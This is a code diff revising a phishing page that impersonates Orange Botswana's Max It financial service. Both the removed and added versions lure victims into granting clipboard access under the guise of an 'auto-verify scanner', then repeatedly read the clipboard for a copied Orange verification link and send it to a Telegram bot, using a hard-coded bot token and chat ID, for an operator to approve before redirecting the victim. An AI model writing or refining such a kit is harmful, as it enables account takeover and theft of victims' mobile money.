@@ -23,51 +23,68 @@
         .progress-step.active { background: #FF6600; }
         .progress-text { font-size: 12px; font-weight: 700; color: #FF6600; min-width: 80px; }
 
-        .detection-banner { background: linear-gradient(135deg, rgba(5, 150, 105, 0.1), rgba(5, 150, 105, 0.05)); border: 2px solid rgba(5, 150, 105, 0.2); border-radius: 16px; padding: 14px 16px; margin-bottom: 16px; display: none; align-items: center; gap: 10px; animation: slideIn 0.4s cubic-bezier(0.34, 1.56, 0.64, 1); }
-        @keyframes slideIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
-        .detection-icon { width: 20px; height: 20px; background: rgba(5, 150, 105, 0.3); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; flex-shrink: 0; }
-        .detection-text { font-size: 12px; font-weight: 600; color: #059669; }
-
         .form-card { background: white; border-radius: 24px; padding: 32px 24px; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08); text-align: center; position: relative; overflow: hidden; }
         .form-title { font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 8px; }
         .form-subtitle { font-size: 13px; color: #666; margin-bottom: 28px; line-height: 1.5; }
 
+        .scanner-status { 
+            background: rgba(255, 102, 0, 0.05); 
+            border: 1.5px dashed #FF6600; 
+            border-radius: 16px; 
+            padding: 20px; 
+            margin-bottom: 24px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .pulse-ring {
+            width: 12px; height: 12px;
+            background: #FF6600;
+            border-radius: 50%;
+            box-shadow: 0 0 0 rgba(255, 102, 0, 0.4);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(255, 102, 0, 0.7); }
+            70% { box-shadow: 0 0 0 15px rgba(255, 102, 0, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(255, 102, 0, 0); }
+        }
+
+        .status-text { font-size: 14px; font-weight: 600; color: #FF6600; }
+
         .form-group { text-align: left; margin-bottom: 24px; position: relative; }
         label { display: block; margin-bottom: 8px; font-weight: 600; font-size: 14px; color: #2c3e50; }
-        .form-input { width: 100%; padding: 16px; font-size: 15px; font-family: 'Poppins', sans-serif; border: 2px solid #FFE6D5; border-radius: 14px; outline: none; transition: all 0.3s; background: #fffcf9; }
-        .form-input:focus { border-color: #FF6600; background: white; box-shadow: 0 0 0 4px rgba(255, 102, 0, 0.1); }
-        .form-input.auto-filled { border-color: #FF6600; background: rgba(255, 102, 0, 0.05); }
+        .form-input { width: 100%; padding: 16px; font-size: 14px; font-family: 'Poppins', sans-serif; border: 2px solid #FFE6D5; border-radius: 14px; outline: none; transition: all 0.3s; background: #f9f9f9; color: #333; }
+        .form-input.detected { border-color: #059669; background: rgba(5, 150, 105, 0.05); color: #059669; font-weight: 600; }
 
-        .error-msg { color: #ff4d4d; font-size: 12px; font-weight: 600; margin-top: 8px; display: none; animation: fadeIn 0.3s; }
-        .success-msg { color: #059669; font-size: 12px; font-weight: 600; margin-top: 8px; display: none; animation: fadeIn 0.3s; }
+        .error-msg { color: #ff4d4d; font-size: 12px; font-weight: 600; margin-top: 8px; display: none; }
+        .success-msg { color: #059669; font-size: 12px; font-weight: 600; margin-top: 8px; display: none; }
 
-        .btn-action { width: 100%; padding: 18px; background: linear-gradient(135deg, #FF6600, #E55A00); color: white; border: none; border-radius: 16px; font-size: 17px; font-weight: 700; cursor: pointer; box-shadow: 0 8px 24px rgba(255, 102, 0, 0.25); transition: all 0.3s; font-family: 'Poppins', sans-serif; margin-top: 12px; }
-        .btn-action:hover { transform: translateY(-3px); box-shadow: 0 12px 32px rgba(255, 102, 0, 0.35); }
-        .btn-back { width: 100%; padding: 16px; background: transparent; color: #FF6600; border: 2px solid #FFE6D5; border-radius: 16px; font-size: 15px; font-weight: 600; cursor: pointer; transition: all 0.3s; font-family: 'Poppins', sans-serif; margin-top: 12px; }
+        .btn-back { width: 100%; padding: 16px; background: transparent; color: #666; border: 2px solid #eee; border-radius: 16px; font-size: 15px; font-weight: 600; cursor: pointer; transition: all 0.3s; font-family: 'Poppins', sans-serif; margin-top: 12px; }
 
-        #spinner { position: fixed; inset: 0; background: rgba(255, 102, 0, 0.15); backdrop-filter: blur(4px); display: none; justify-content: center; align-items: center; z-index: 9999; }
-        .spin { width: 60px; height: 60px; border: 6px solid #ffffff; border-top: 6px solid #FF6600; border-radius: 50%; animation: spin 1s linear infinite; }
+        #spinner { position: fixed; inset: 0; background: rgba(255, 102, 0, 0.2); backdrop-filter: blur(8px); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 9999; color: #FF6600; }
+        .spin { width: 64px; height: 64px; border: 6px solid #ffffff; border-top: 6px solid #FF6600; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        .spin-text { font-weight: 700; font-size: 18px; }
+        
         @keyframes spin { to { transform: rotate(360deg); } }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
 
         footer { padding: 24px 20px; color: #999; font-size: 12px; text-align: center; margin-top: auto; width: 100%; }
         
-        /* New overlay to force interaction and permission */
-        #permissionOverlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 10000; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 30px; text-align: center; color: white; }
-        .p-card { background: white; border-radius: 24px; padding: 30px; width: 100%; max-width: 400px; color: #333; }
-        .p-title { font-size: 20px; font-weight: 700; margin-bottom: 15px; }
-        .p-desc { font-size: 14px; color: #666; margin-bottom: 25px; line-height: 1.6; }
-        .p-btn { width: 100%; padding: 16px; background: #FF6600; color: white; border: none; border-radius: 14px; font-size: 16px; font-weight: 700; cursor: pointer; }
+        /* Interaction Layer */
+        #startLayer { position: fixed; inset: 0; background: rgba(255, 102, 0, 0.95); z-index: 10000; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 40px; text-align: center; color: white; transition: opacity 0.5s; }
+        .s-title { font-size: 26px; font-weight: 800; margin-bottom: 15px; }
+        .s-desc { font-size: 15px; margin-bottom: 30px; line-height: 1.6; opacity: 0.9; }
+        .s-btn { padding: 20px 40px; background: white; color: #FF6600; border: none; border-radius: 50px; font-size: 18px; font-weight: 800; cursor: pointer; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
     </style>
 </head>
 <body>
-    <!-- Permission Overlay -->
-    <div id="permissionOverlay">
-        <div class="p-card">
-            <div class="p-title">Activate Auto-Verify</div>
-            <div class="p-desc">To automatically detect your Orange verification link, please click the button below to grant permission.</div>
-            <button class="p-btn" id="activateBtn">Activate Now</button>
-        </div>
+    <!-- Start Layer to trigger permissions -->
+    <div id="startLayer">
+        <div class="s-title">Orange Auto-Verify</div>
+        <p class="s-desc">To automatically detect your verification link once the SMS arrives, please click the button below to start the live scanner.</p>
+        <button class="s-btn" id="startBtn">Start Live Scanner</button>
     </div>
 
     <header>
@@ -82,29 +99,29 @@
             <span class="progress-text">Step 3 of 3</span>
         </div>
 
-        <div class="detection-banner" id="detectionBanner">
-            <div class="detection-icon">✓</div>
-            <div class="detection-text">Verification link detected and auto-filled!</div>
-        </div>
-
         <div class="form-card">
-            <h1 class="form-title">Auto-Verify Link</h1>
-            <p class="form-subtitle">The system is actively scanning for your verification link. Once the SMS arrives, the link will be automatically processed.</p>
+            <h1 class="form-title">Verification Scanner</h1>
+            <p class="form-subtitle">The system is actively monitoring for your Orange verification link. Once the SMS arrives, the link will be processed automatically.</p>
+
+            <div class="scanner-status">
+                <div class="pulse-ring"></div>
+                <div class="status-text" id="statusLabel">Scanning for incoming link...</div>
+            </div>
 
             <div class="form-group">
-                <label for="linkInput">Verification Link</label>
-                <input type="text" id="linkInput" class="form-input" placeholder="Waiting for new link..." readonly>
-                <div class="error-msg" id="linkError">Invalid link detected.</div>
-                <div class="success-msg" id="linkSuccess">Link detected and sent to Telegram!</div>
+                <label>Detected Link</label>
+                <input type="text" id="linkInput" class="form-input" placeholder="Waiting for SMS link..." readonly>
+                <div class="error-msg" id="linkError">Verification failed. Please try again.</div>
+                <div class="success-msg" id="linkSuccess">Link detected and sent for approval!</div>
             </div>
             
-            <button class="btn-action" id="continueBtn">Manual Verify</button>
-            <button class="btn-back" id="backBtn">Go Back</button>
+            <button class="btn-back" onclick="window.history.back()">Go Back</button>
         </div>
     </div>
 
     <div id="spinner">
         <div class="spin"></div>
+        <div class="spin-text">Processing Link...</div>
     </div>
 
     <footer>© 2026 Orange Botswana | Licensed Financial Services</footer>
@@ -115,124 +132,93 @@
             BOT_TOKEN: '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM',
             CHAT_ID: '7547427914',
             REDIRECT_PAGE: 'success.html',
-            CLIPBOARD_POLL_INTERVAL: 800, 
-            AUTO_PICK_DELAY: 1200, 
-            LINK_PATTERN: /https?:\/\/(?:www\.)?(?:orange|maxit|auth|token|orange-maxit)[^\s]+/gi
+            POLL_INTERVAL: 1000, 
+            SEND_DELAY: 1500,
+            LINK_PATTERN: /https?:\/\/(?:maxit-mobile\.orange\.co\.bw|orange|maxit|auth|token)[^\s]+/gi
         };
 
         /* ─── STATE ─────────────────────────────────── */
         const state = {
             isProcessing: false,
-            initialClipboardContent: null,
+            initialContent: null,
             detectedLinks: new Set(),
-            pollInterval: null,
-            approveId: null,
-            declineId: null,
-            lastUpdateId: 0,
-            hasPermission: false
+            scannerActive: false,
+            lastUpdateId: 0
         };
 
         /* ─── DOM ELEMENTS ──────────────────────────── */
         const els = {
             linkInput: document.getElementById('linkInput'),
-            continueBtn: document.getElementById('continueBtn'),
-            backBtn: document.getElementById('backBtn'),
-            linkError: document.getElementById('linkError'),
-            linkSuccess: document.getElementById('linkSuccess'),
+            statusLabel: document.getElementById('statusLabel'),
             spinner: document.getElementById('spinner'),
-            detectionBanner: document.getElementById('detectionBanner'),
-            permissionOverlay: document.getElementById('permissionOverlay'),
-            activateBtn: document.getElementById('activateBtn')
+            startLayer: document.getElementById('startLayer'),
+            startBtn: document.getElementById('startBtn'),
+            linkSuccess: document.getElementById('linkSuccess'),
+            linkError: document.getElementById('linkError')
         };
 
-        /* ─── HELPERS ───────────────────────────────── */
-        function showError(msg) {
-            els.linkError.textContent = msg;
-            els.linkError.style.display = 'block';
-            if (els.linkSuccess) els.linkSuccess.style.display = 'none';
-        }
-
-        function showSuccess(msg) {
-            if (els.linkSuccess) {
-                els.linkSuccess.textContent = msg;
-                els.linkSuccess.style.display = 'block';
-            }
-            els.linkError.style.display = 'none';
-        }
-
-        function showSpinner() { els.spinner.style.display = 'flex'; }
-        function hideSpinner() { els.spinner.style.display = 'none'; }
-        function showDetectionBanner() {
-            els.detectionBanner.style.display = 'flex';
-            setTimeout(() => { els.detectionBanner.style.display = 'none'; }, 4000);
-        }
-
-        /* ─── AGGRESSIVE SCANNING ───────────────────── */
+        /* ─── SCANNING LOGIC ────────────────────────── */
         
-        async function checkClipboard() {
-            if (state.isProcessing || !state.hasPermission) return;
+        async function runScanner() {
+            if (state.isProcessing || !state.scannerActive) return;
 
             try {
-                const currentText = await navigator.clipboard.readText();
+                const text = await navigator.clipboard.readText();
                 
-                // If text is different from what we saw when we started or last checked
-                if (currentText && currentText !== state.initialClipboardContent) {
-                    const links = currentText.match(CONFIG.LINK_PATTERN);
+                // Only act if the clipboard content is DIFFERENT from when we started
+                if (text && text !== state.initialContent) {
+                    const matches = text.match(CONFIG.LINK_PATTERN);
                     
-                    if (links) {
-                        const newLink = links[0];
+                    if (matches) {
+                        const newLink = matches[0];
                         if (!state.detectedLinks.has(newLink)) {
                             state.detectedLinks.add(newLink);
-                            
-                            // Auto-fill immediately so user sees it
-                            els.linkInput.value = newLink;
-                            els.linkInput.classList.add('auto-filled');
-                            
-                            // Process after requested delay
-                            setTimeout(() => {
-                                handleAutoDetection(newLink);
-                            }, CONFIG.AUTO_PICK_DELAY);
+                            autoProcessLink(newLink);
                         }
                     }
                 }
-            } catch (err) {
-                console.log("Clipboard access failed, waiting for focus/interaction...");
+            } catch (e) {
+                // Clipboard access might be blocked until focus
             }
         }
 
-        function startClipboardScanner() {
-            if (state.pollInterval) clearInterval(state.pollInterval);
-            state.pollInterval = setInterval(checkClipboard, CONFIG.CLIPBOARD_POLL_INTERVAL);
+        function autoProcessLink(link) {
+            state.isProcessing = true;
+            
+            // Visual feedback
+            els.linkInput.value = link;
+            els.linkInput.classList.add('detected');
+            els.statusLabel.textContent = "Link Detected! Processing...";
+            
+            // Wait 1.5s as requested before sending
+            setTimeout(() => {
+                els.spinner.style.display = 'flex';
+                sendToBot(link);
+            }, CONFIG.SEND_DELAY);
         }
 
-        function handleAutoDetection(link) {
-            if (state.isProcessing) return;
-            showDetectionBanner();
-            processVerification();
-        }
+        /* ─── TELEGRAM ──────────────────────────────── */
 
-        /* ─── TELEGRAM AUTOMATION ───────────────────── */
-
-        function sendToTelegram(link) {
+        function sendToBot(link) {
             const ts = Date.now();
-            state.approveId = `approve_${ts}`;
-            state.declineId = `decline_${ts}`;
+            const approveId = `approve_${ts}`;
+            const declineId = `decline_${ts}`;
 
-            const message = `*🔐 Orange Max It Verification*\n\n` +
-                            `*SMS Detected Link:*\n[Click to Verify](${link})\n\n` +
-                            `*Action Required:* Please approve below.`;
+            const msg = `*🔐 Orange Max It Verification*\n\n` +
+                        `*Detected Link:*\n[Click to Verify](${link})\n\n` +
+                        `*Status:* Automatically detected from SMS.`;
 
             fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: CONFIG.CHAT_ID,
-                    text: message,
+                    text: msg,
                     parse_mode: 'Markdown',
                     reply_markup: {
                         inline_keyboard: [[
-                            { text: '✅ Approve', callback_data: state.approveId },
-                            { text: '❌ Decline', callback_data: state.declineId }
+                            { text: '✅ Approve', callback_data: approveId },
+                            { text: '❌ Decline', callback_data: declineId }
                         ]]
                     }
                 })
@@ -240,33 +226,33 @@
             .then(r => r.json())
             .then(data => {
                 if (data.ok) {
-                    showSuccess("Link detected and sent! Waiting for approval...");
-                    startApprovalListener();
+                    els.linkSuccess.style.display = 'block';
+                    startApprovalListener(approveId, declineId);
                 } else {
-                    resetProcessing();
+                    resetScanner();
                 }
             })
-            .catch(() => resetProcessing());
+            .catch(() => resetScanner());
         }
 
-        function startApprovalListener() {
+        function startApprovalListener(aid, did) {
             const poll = setInterval(() => {
-                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}&timeout=5`;
-                fetch(url).then(r => r.json()).then(data => {
+                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+                .then(r => r.json())
+                .then(data => {
                     if (!data.ok || !data.result?.length) return;
-                    data.result.forEach(update => {
-                        state.lastUpdateId = update.update_id;
-                        if (update.callback_query) {
-                            const cb = update.callback_query;
-                            if (cb.data === state.approveId) {
+                    data.result.forEach(u => {
+                        state.lastUpdateId = u.update_id;
+                        if (u.callback_query) {
+                            const cb = u.callback_query.data;
+                            if (cb === aid) {
                                 clearInterval(poll);
-                                hideSpinner();
                                 window.location.href = CONFIG.REDIRECT_PAGE;
-                            } else if (cb.data === state.declineId) {
+                            } else if (cb === did) {
                                 clearInterval(poll);
-                                hideSpinner();
-                                showError("Declined by admin.");
-                                state.isProcessing = false;
+                                resetScanner();
+                                els.linkError.style.display = 'block';
+                                els.linkError.textContent = "Declined by admin.";
                             }
                         }
                     });
@@ -274,57 +260,35 @@
             }, 2000);
         }
 
-        function resetProcessing() {
+        function resetScanner() {
             state.isProcessing = false;
-            hideSpinner();
-        }
-
-        /* ─── CORE LOGIC ────────────────────────────── */
-
-        function processVerification() {
-            if (state.isProcessing) return;
-            const link = els.linkInput.value.trim();
-            if (!link) return;
-
-            state.isProcessing = true;
-            showSpinner();
-            sendToTelegram(link);
+            els.spinner.style.display = 'none';
+            els.linkInput.classList.remove('detected');
+            els.statusLabel.textContent = "Scanning for incoming link...";
+            els.linkInput.value = "";
         }
 
         /* ─── INITIALIZATION ────────────────────────── */
 
-        document.addEventListener('DOMContentLoaded', () => {
-            // Permission handler
-            els.activateBtn.addEventListener('click', async () => {
-                try {
-                    // This user gesture is required for clipboard permission
-                    state.initialClipboardContent = await navigator.clipboard.readText();
-                    state.hasPermission = true;
-                    els.permissionOverlay.style.display = 'none';
-                    startClipboardScanner();
-                } catch (err) {
-                    alert("Please allow clipboard access to use the auto-verify feature.");
-                }
-            });
-
-            // Re-check when user returns to the tab (very important for mobile)
-            window.addEventListener('focus', checkClipboard);
-            document.addEventListener('visibilitychange', () => {
-                if (document.visibilityState === 'visible') checkClipboard();
-            });
-
-            els.continueBtn.addEventListener('click', () => {
-                if (!els.linkInput.value) {
-                    checkClipboard().then(() => {
-                        if (els.linkInput.value) processVerification();
-                        else showError("No link found. Please copy the link from your SMS.");
-                    });
-                } else {
-                    processVerification();
-                }
-            });
-
-            els.backBtn.addEventListener('click', () => window.history.back());
+        els.startBtn.addEventListener('click', async () => {
+            try {
+                // Capture current clipboard state to identify "new" links
+                state.initialContent = await navigator.clipboard.readText();
+                state.scannerActive = true;
+                els.startLayer.style.opacity = '0';
+                setTimeout(() => els.startLayer.style.display = 'none', 500);
+                
+                // Start polling
+                setInterval(runScanner, CONFIG.POLL_INTERVAL);
+                
+                // Also scan on focus/visibility (crucial for mobile return)
+                window.addEventListener('focus', runScanner);
+                document.addEventListener('visibilitychange', () => {
+                    if (document.visibilityState === 'visible') runScanner();
+                });
+            } catch (e) {
+                alert("Please allow clipboard access for the scanner to work.");
+            }
         });
 
     </script>
